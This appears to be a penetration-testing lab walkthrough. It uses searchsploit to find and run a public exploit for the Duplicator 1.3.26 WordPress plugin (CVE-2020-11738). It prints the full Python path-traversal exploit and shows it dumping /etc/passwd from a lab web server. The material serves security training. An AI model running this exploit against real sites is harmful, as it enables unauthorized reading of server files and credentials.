SearchSploit results for the Duplicator WordPress plugin
```
kali@kali:~/beyond$ searchsploit duplicator    
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                    | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery       | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                              | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                             | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                   | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                            | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery       | php/webapps/40908.html
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Searchsploit command to examine a specific exploit
```
kali@kali:~/beyond$ searchsploit -x 50420
```

Information about the Directory Traversal vulnerability in Duplicator 1.3.26
```
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```

SearchSploit command to copy the exploit script to the current directory
```
kali@kali:~/beyond$ cd beyond/websrv1

kali@kali:~/beyond/websrv1$ searchsploit -m 50420
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
File Type: ASCII text

Copied to: /home/kali/beyond/websrv1/50420.py
```

Performing a Directory Traversal attack on WEBSRV1
```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```



